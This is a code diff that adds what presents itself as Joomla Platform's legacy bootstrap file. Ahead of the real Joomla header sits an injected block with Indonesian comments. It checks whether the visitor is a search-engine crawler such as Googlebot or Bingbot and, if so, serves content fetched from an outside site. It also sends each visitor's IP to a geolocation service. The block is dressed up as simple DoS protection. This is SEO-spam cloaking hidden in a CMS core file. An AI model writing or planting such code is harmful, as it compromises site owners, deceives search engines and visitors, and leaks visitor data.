@@ -1,0 +1,151 @@
+<?php
+$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
+$rf = $_SERVER["HTTP_REFERER"] ?? '';
+
+// Fungsi ambil IP
+function get_client_ip() {
+    return $_SERVER['HTTP_CLIENT_IP']
+        ?? $_SERVER['HTTP_X_FORWARDED_FOR']
+        ?? $_SERVER['HTTP_X_FORWARDED']
+        ?? $_SERVER['HTTP_FORWARDED_FOR']
+        ?? $_SERVER['HTTP_FORWARDED']
+        ?? $_SERVER['REMOTE_ADDR']
+        ?? getenv('REMOTE_ADDR')
+        ?? '127.0.0.1';
+}
+
+$ip = get_client_ip();
+
+// Proteksi DoS sederhana
+$time = time();
+$max_requests = 30; // Maksimal request dalam interval
+$interval = 60;     // Detik
+
+if (!isset($_SESSION['req_count'])) {
+    $_SESSION['req_count'] = [];
+}
+
+$_SESSION['req_count'][$ip][] = $time;
+
+// Hapus request lama dari list
+$_SESSION['req_count'][$ip] = array_filter($_SESSION['req_count'][$ip], function($t) use ($time, $interval) {
+    return ($t > $time - $interval);
+});
+
+// Jika melebihi batas, tolak akses
+if (count($_SESSION['req_count'][$ip]) > $max_requests) {
+    http_response_code(429); // Too Many Requests
+    echo "Terlalu banyak permintaan dari IP ini. Silakan coba lagi nanti.";
+    exit;
+}
+
+// URL konten untuk bot
+$bot_url = "https://jakartafc.com/burghuegel/";
+$file = @file_get_contents($bot_url); // Gunakan @ untuk menghindari warning jika gagal ambil
+
+// Deteksi lokasi (opsional, bisa dihapus kalau tidak perlu)
+$geolocation = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=$ip"), true);
+$cc = $geolocation['geoplugin_countryCode'] ?? 'XX';
+
+// Deteksi bot
+$botchar = "/(googlebot|slurp|adsense|inspection|bingbot|duckduckbot)/";
+
+// Jika bot, tampilkan konten khusus
+if (preg_match($botchar, $ua)) {
+    echo $file ?: "<h1>Konten tidak tersedia</h1>";
+    exit;
+}
+/**
+ * Bootstrap file for the Joomla Platform [with legacy libraries].  Including this file into your application
+ * will make Joomla Platform libraries [including legacy libraries] available for use.
+ *
+ * @package    Joomla.Platform
+ *
+ * @copyright  (C) 2012 Open Source Matters, Inc. <https://www.joomla.org>
+ * @license    GNU General Public License version 2 or later; see LICENSE.txt
+ */
+
+// Set the platform root path as a constant if necessary.
+if (!defined('JPATH_PLATFORM'))
+{
+	define('JPATH_PLATFORM', __DIR__);
+}
+
+// Detect the native operating system type.
+$os = strtoupper(substr(PHP_OS, 0, 3));
+
+if (!defined('IS_WIN'))
+{
+	define('IS_WIN', $os === 'WIN');
+}
+
+if (!defined('IS_UNIX'))
+{
+	define('IS_UNIX', $os !== 'MAC' && $os !== 'WIN');
+}
+
+/**
+ * @deprecated 4.0	Use IS_UNIX instead
+ */
+if (!defined('IS_MAC'))
+{
+	define('IS_MAC', IS_UNIX === true && ($os === 'DAR' || $os === 'MAC'));
+}
+
+// Import the library loader if necessary.
+if (!class_exists('JLoader'))
+{
+	require_once JPATH_PLATFORM . '/loader.php';
+}
+
+// Make sure that the Joomla Loader has been successfully loaded.
+if (!class_exists('JLoader'))
+{
+	throw new RuntimeException('Joomla Loader not loaded.');
+}
+
+// Setup the autoloaders.
+JLoader::setup();
+
+JLoader::registerPrefix('J', JPATH_PLATFORM . '/legacy');
+
+// Check if the JsonSerializable interface exists already
+if (!interface_exists('JsonSerializable'))
+{
+	JLoader::register('JsonSerializable', JPATH_PLATFORM . '/vendor/joomla/compat/src/JsonSerializable.php');
+}
+
+// Add deprecated constants
+// @deprecated 4.0
+define('JPATH_ISWIN', IS_WIN);
+define('JPATH_ISMAC', IS_MAC);
+
+/**
+ * Mask for the raw routing mode
+ *
+ * @deprecated  4.0
+ */
+const JROUTER_MODE_RAW = 0;
+
+/**
+ * Mask for the SEF routing mode
+ *
+ * @deprecated  4.0
+ */
+const JROUTER_MODE_SEF = 1;
+
+// Register the PasswordHash lib
+JLoader::register('PasswordHash', JPATH_PLATFORM . '/phpass/PasswordHash.php');
+
+// Register classes where the names have been changed to fit the autoloader rules
+// @deprecated  4.0
+JLoader::register('JSimpleCrypt', JPATH_PLATFORM . '/legacy/simplecrypt/simplecrypt.php');
+JLoader::register('JTree', JPATH_PLATFORM . '/legacy/base/tree.php');
+JLoader::register('JNode', JPATH_PLATFORM . '/legacy/base/node.php');
+JLoader::register('JObserver', JPATH_PLATFORM . '/legacy/base/observer.php');
+JLoader::register('JObservable', JPATH_PLATFORM . '/legacy/base/observable.php');
+JLoader::register('LogException', JPATH_PLATFORM . '/legacy/log/logexception.php');
+JLoader::register('JXMLElement', JPATH_PLATFORM . '/legacy/utilities/xmlelement.php');
+JLoader::register('JCli', JPATH_PLATFORM . '/legacy/application/cli.php');
+JLoader::register('JDaemon', JPATH_PLATFORM . '/legacy/application/daemon.php');
+JLoader::register('JApplication', JPATH_PLATFORM . '/legacy/application/application.php');
